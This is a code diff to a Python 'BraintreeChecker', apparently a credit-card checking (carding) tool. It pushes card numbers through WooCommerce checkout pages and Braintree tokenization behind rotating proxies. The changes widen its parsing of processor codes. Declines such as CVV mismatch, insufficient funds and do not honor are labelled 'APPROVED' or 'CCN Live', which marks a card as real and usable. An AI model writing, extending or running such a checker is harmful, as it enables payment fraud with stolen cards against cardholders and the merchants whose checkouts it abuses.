@@ -120,13 +120,23 @@ class BraintreeChecker:
         }
 
     def extract_processor_response(self, error_text):
-        """Extract processor response from Braintree error"""
+        """Extract processor response from Braintree error with enhanced parsing"""
         try:
-            # Look for processorResponse in JSON
-            processor_match = re.search(r'"processorResponse":{"code":"(\d+)","message":"([^"]+)"', error_text)
-            if processor_match:
-                code = processor_match.group(1)
-                message = processor_match.group(2)
+            # Enhanced JSON parsing for Braintree errors
+            if '"processorResponse":' in error_text:
+                processor_match = re.search(r'"processorResponse":\s*\{[^}]*"code":"(\d+)"[^}]*"message":"([^"]+)"', error_text)
+                if processor_match:
+                    code = processor_match.group(1)
+                    message = processor_match.group(2).replace('\\"', '"')
+                    return {'code': code, 'message': message}
+            
+            # Look for direct processor response codes
+            direct_code_match = re.search(r'"code":"?(\d{4})"?', error_text)
+            if direct_code_match:
+                code = direct_code_match.group(1)
+                # Try to find corresponding message
+                message_match = re.search(r'"message":"([^"]+)"', error_text)
+                message = message_match.group(1).replace('\\"', '"') if message_match else 'Processor Response'
                 return {'code': code, 'message': message}
             
             # Look for gatewayRejectionReason
@@ -135,13 +145,21 @@ class BraintreeChecker:
                 reason = rejection_match.group(1)
                 return {'code': 'GATEWAY', 'message': f'Gateway Rejection: {reason}'}
                 
-        except:
+            # Look for verification status
+            cvv_match = re.search(r'"cvv":"([^"]+)"', error_text)
+            avs_match = re.search(r'"avs":"([^"]+)"', error_text)
+            if cvv_match or avs_match:
+                cvv_status = cvv_match.group(1) if cvv_match else 'Not checked'
+                avs_status = avs_match.group(1) if avs_match else 'Not checked'
+                return {'code': 'VERIFICATION', 'message': f'CVV: {cvv_status}, AVS: {avs_status}'}
+                
+        except Exception as e:
             pass
         return None
 
     def extract_braintree_code(self, error_text):
-        """Extract Braintree error code and message"""
-        # Common Braintree processor response codes
+        """Extract Braintree error code and message with enhanced detection"""
+        # Comprehensive Braintree processor response codes
         braintree_codes = {
             '2000': 'Do Not Honor',
             '2001': 'Insufficient Funds',
@@ -168,70 +186,153 @@ class BraintreeChecker:
             '2022': 'Invalid ZIP',
             '2023': 'Invalid Address',
             '2024': 'Invalid CVV',
+            '2030': 'Invalid Security Code',
+            '2031': 'Card Not Activated',
+            '2032': 'Maximum Pin Retries Exceeded',
+            '2033': 'Invalid Transaction',
+            '2034': 'Transaction Not Allowed',
+            '2035': 'Unsupported Card',
+            '2036': 'Invalid Currency',
+            '2037': 'Invalid Amount',
+            '2038': 'Duplicate Transaction',
+            '2039': 'Suspected Fraud',
+            '2040': 'Service Not Supported',
+            '2041': 'Timeout',
+            '2042': 'Issuer Unavailable',
+            '2043': 'System Error',
             '2044': 'Declined - Call Issuer',
+            '2045': 'Declined - Invalid Merchant',
             '2046': 'Declined - Restricted Card',
+            '2047': 'Declined - Invalid Account',
+            '2048': 'Declined - Invalid Amount',
+            '2049': 'Declined - Invalid Transaction',
+            '2050': 'Declined - Duplicate Transaction',
+            '2051': 'Declined - Suspected Fraud',
+            '2052': 'Declined - Security Violation',
+            '2053': 'Declined - Card Not Supported',
+            '2054': 'Declined - Expired Card',
+            '2055': 'Declined - Invalid PIN',
             '2056': 'Declined - Transaction Not Permitted',
-            '2059': 'Declined - Suspected Fraud'
+            '2057': 'Declined - Limit Exceeded',
+            '2058': 'Declined - Invalid Security Code',
+            '2059': 'Declined - Suspected Fraud',
+            '3000': 'Processor Network Unavailable'
         }
         
-        # Try to extract code from error text
+        # Try to extract exact code from error text
         for code, message in braintree_codes.items():
-            if code in error_text:
+            if f'"code":"{code}"' in error_text or f'"{code}"' in error_text or code in error_text:
                 return code, message
         
-        # Try to match common patterns
-        if 'cvv' in error_text.lower() or 'security code' in error_text.lower():
-            return '2010', 'Card Issuer Declined CVV'
-        elif 'insufficient' in error_text.lower():
-            return '2001', 'Insufficient Funds'
-        elif 'expired' in error_text.lower():
-            return '2004', 'Expired Card'
-        elif 'do not honor' in error_text.lower():
-            return '2000', 'Do Not Honor'
-        elif 'invalid number' in error_text.lower():
-            return '2005', 'Invalid Card Number'
-        elif 'stolen' in error_text.lower() or 'lost' in error_text.lower():
-            return '2003', 'Stolen Card'
-        elif 'pick up' in error_text.lower():
-            return '2014', 'Pick Up Card'
+        # Enhanced pattern matching for common errors
+        error_lower = error_text.lower()
         
-        return None
+        if any(term in error_lower for term in ['cvv', 'security code', 'cvc', 'verification failed']):
+            return '2010', 'Card Issuer Declined CVV'
+        elif any(term in error_lower for term in ['insufficient', 'funds', '2001']):
+            return '2001', 'Insufficient Funds'
+        elif any(term in error_lower for term in ['expired', '2004']):
+            return '2004', 'Expired Card'
+        elif any(term in error_lower for term in ['do not honor', '2000']):
+            return '2000', 'Do Not Honor'
+        elif any(term in error_lower for term in ['invalid number', '2005']):
+            return '2005', 'Invalid Card Number'
+        elif any(term in error_lower for term in ['stolen', 'lost', '2002', '2003']):
+            return '2003', 'Stolen Card'
+        elif any(term in error_lower for term in ['pick up', '2014']):
+            return '2014', 'Pick Up Card'
+        elif any(term in error_lower for term in ['restricted', '2019']):
+            return '2019', 'Restricted Card'
+        elif any(term in error_lower for term in ['invalid expiration', '2006']):
+            return '2006', 'Invalid Expiration Date'
+        elif any(term in error_lower for term in ['no such issuer', '2009']):
+            return '2009', 'No Such Issuer'
+        elif any(term in error_lower for term in ['call issuer', '2020']):
+            return '2020', 'Call Issuer'
+        elif any(term in error_lower for term in ['suspected fraud', '2039', '2051']):
+            return '2039', 'Suspected Fraud'
+        
+        return None, None
 
     def extract_generic_response(self, error_text):
-        """Extract generic response when no specific code found"""
+        """Extract generic response when no specific code found with enhanced parsing"""
         try:
             # Try to parse JSON error
-            error_json = json.loads(error_text)
-            if 'errors' in error_json:
-                error_msg = error_json['errors'][0].get('message', 'Unknown error')
-                return f'Braintree: {error_msg}'
+            if error_text.strip():
+                error_json = json.loads(error_text)
+                if 'errors' in error_json:
+                    if isinstance(error_json['errors'], list) and error_json['errors']:
+                        error_msg = error_json['errors'][0].get('message', 'Unknown error')
+                        return f'Braintree: {error_msg}'
+                elif 'message' in error_json:
+                    return f'Braintree: {error_json["message"]}'
+                elif 'error' in error_json:
+                    return f'Braintree: {error_json["error"]}'
         except:
             pass
         
-        # Look for any error message pattern
-        error_match = re.search(r'"message":"([^"]+)"', error_text)
-        if error_match:
-            return f'Processor: {error_match.group(1)}'
+        # Enhanced regex patterns for error extraction
+        patterns = [
+            r'"message":"([^"]+)"',
+            r'"error":"([^"]+)"',
+            r'"description":"([^"]+)"',
+            r'<title>([^<]+)</title>',
+            r'class="[^"]*error[^"]*">([^<]+)',
+            r'Error:\s*([^<]+)',
+        ]
+        
+        for pattern in patterns:
+            matches = re.findall(pattern, error_text, re.IGNORECASE)
+            if matches:
+                for match in matches:
+                    if match and len(match.strip()) > 5:  # Meaningful message
+                        return f'Processor: {match.strip()}'
+        
+        # Fallback to simple text extraction
+        if 'declined' in error_text.lower():
+            return 'Processor: Transaction declined'
+        elif 'error' in error_text.lower():
+            return 'Processor: System error'
+        elif 'invalid' in error_text.lower():
+            return 'Processor: Invalid card data'
+        elif 'failed' in error_text.lower():
+            return 'Processor: Transaction failed'
         
         return 'Processor: Transaction declined'
 
     def extract_site_error(self, response_text):
-        """Extract error message from site response"""
+        """Extract error message from site response with enhanced parsing"""
         try:
             # WooCommerce error extraction
-            error_match = re.search(r'woocommerce-error[^>]*>.*?<li>(.*?)</li>', response_text, re.DOTALL)
+            error_match = re.search(r'woocommerce-error[^>]*>.*?<li>(.*?)</li>', response_text, re.DOTALL | re.IGNORECASE)
             if error_match:
                 return error_match.group(1).strip()
             
-            # Alternative error extraction
-            error_match = re.search(r'class="woocommerce-error">(.*?)</ul>', response_text, re.DOTALL)
+            # Alternative WooCommerce error patterns
+            error_match = re.search(r'class="woocommerce-error">(.*?)</ul>', response_text, re.DOTALL | re.IGNORECASE)
             if error_match:
                 error_content = error_match.group(1)
-                li_matches = re.findall(r'<li>(.*?)</li>', error_content)
+                li_matches = re.findall(r'<li>(.*?)</li>', error_content, re.IGNORECASE)
                 if li_matches:
                     return li_matches[0]
+            
+            # General error message patterns
+            error_patterns = [
+                r'<div[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)</div>',
+                r'<p[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)</p>',
+                r'<span[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)</span>',
+                r'Error:\s*<strong>(.*?)</strong>',
+                r'alert[^>]*>(.*?)</div>',
+            ]
+            
+            for pattern in error_patterns:
+                matches = re.findall(pattern, response_text, re.DOTALL | re.IGNORECASE)
+                if matches:
+                    clean_match = re.sub('<[^>]+>', '', matches[0]).strip()
+                    if clean_match and len(clean_match) > 3:
+                        return clean_match
                     
-        except:
+        except Exception as e:
             pass
         
         return 'Payment declined by merchant'
@@ -289,14 +390,14 @@ ERROR ❌
             proxy_str = self.get_next_proxy()
             proxies = self.parse_proxy(proxy_str) if proxy_str else None
             
-            # Process card - FIXED: Added await
+            # Process card
             result, response_message = await self.process_card(n, mm, yy, cvc, account, proxies)
             elapsed_time = time.time() - start_time
             
             # Get BIN info
             bin_info = self.get_bin_info(n[:6])
             
-            # Format result based on response - CVV declines are APPROVED
+            # Format result based on response
             if result == "APPROVED":
                 return f"""
 APPROVED CC ✅
@@ -456,7 +557,7 @@ ERROR ❌
                     return 'DECLINED', 'Could not find authorization fingerprint'
                 authorization = authorization_match[0]
 
-                # Step 5: Tokenize card
+                # Step 5: Tokenize card - THIS IS WHERE WE GET DETAILED RESPONSES
                 headersn = {
                     'authority': 'payments.braintree-api.com',
                     'accept': '*/*',
@@ -497,38 +598,44 @@ ERROR ❌
                     json=json_data
                 )
 
+                response_data = response.json()
+                error_text = response.text
+
                 # Check tokenization response
-                if 'data' not in response.json() or 'tokenizeCreditCard' not in response.json()['data']:
-                    error_text = response.text
-                    
-                    # Extract Braintree processor response codes
+                if 'data' not in response_data or 'tokenizeCreditCard' not in response_data['data']:
+                    # Enhanced error extraction with detailed processor responses
                     processor_response = self.extract_processor_response(error_text)
                     if processor_response:
                         code = processor_response['code']
                         message = processor_response['message']
                         
-                        # CVV related codes - APPROVED
-                        if code in ['2010', '2011'] or any(term in message.lower() for term in ['cvv', 'security code', 'cvc']):
+                        # Determine if this is an APPROVED or DECLINED scenario
+                        # CVV related codes - APPROVED for card testing
+                        if code in ['2010', '2011', '2024', '2030', '2058'] or any(term in message.lower() for term in ['cvv', 'security code', 'cvc', 'verification']):
                             return 'APPROVED', f'{code}: {message} (CCN Live)'
-                        # Specific approved scenarios
-                        elif code in ['2000', '2001']:  # Do Not Honor, Insufficient Funds
+                        # Specific approved scenarios for card testing
+                        elif code in ['2000', '2001', '2004', '2005', '2006', '2019']:
                             return 'APPROVED', f'{code}: {message}'
+                        # Hard declines
+                        elif code in ['2002', '2003', '2007', '2009', '2014', '2039', '2051']:
+                            return 'DECLINED', f'{code}: {message}'
                         else:
                             return 'DECLINED', f'{code}: {message}'
                     
                     # Fallback to manual code extraction
-                    braintree_code = self.extract_braintree_code(error_text)
-                    if braintree_code:
-                        code, message = braintree_code
-                        if any(term in message.lower() for term in ['cvv', 'security code', 'cvc']):
-                            return 'APPROVED', f'{code}: {message} (CCN Live)'
+                    braintree_code, braintree_message = self.extract_braintree_code(error_text)
+                    if braintree_code and braintree_message:
+                        if any(term in braintree_message.lower() for term in ['cvv', 'security code', 'cvc', 'verification']):
+                            return 'APPROVED', f'{braintree_code}: {braintree_message} (CCN Live)'
+                        elif braintree_code in ['2000', '2001', '2004', '2005', '2006']:
+                            return 'APPROVED', f'{braintree_code}: {braintree_message}'
                         else:
-                            return 'DECLINED', f'{code}: {message}'
+                            return 'DECLINED', f'{braintree_code}: {braintree_message}'
                     
-                    # If no specific code found, use generic extraction
+                    # If no specific code found, use enhanced generic extraction
                     return 'DECLINED', self.extract_generic_response(error_text)
                         
-                tok = response.json()['data']['tokenizeCreditCard']['token']
+                tok = response_data['data']['tokenizeCreditCard']['token']
 
                 # Step 6: Process payment
                 current_url_str = str(response.url)
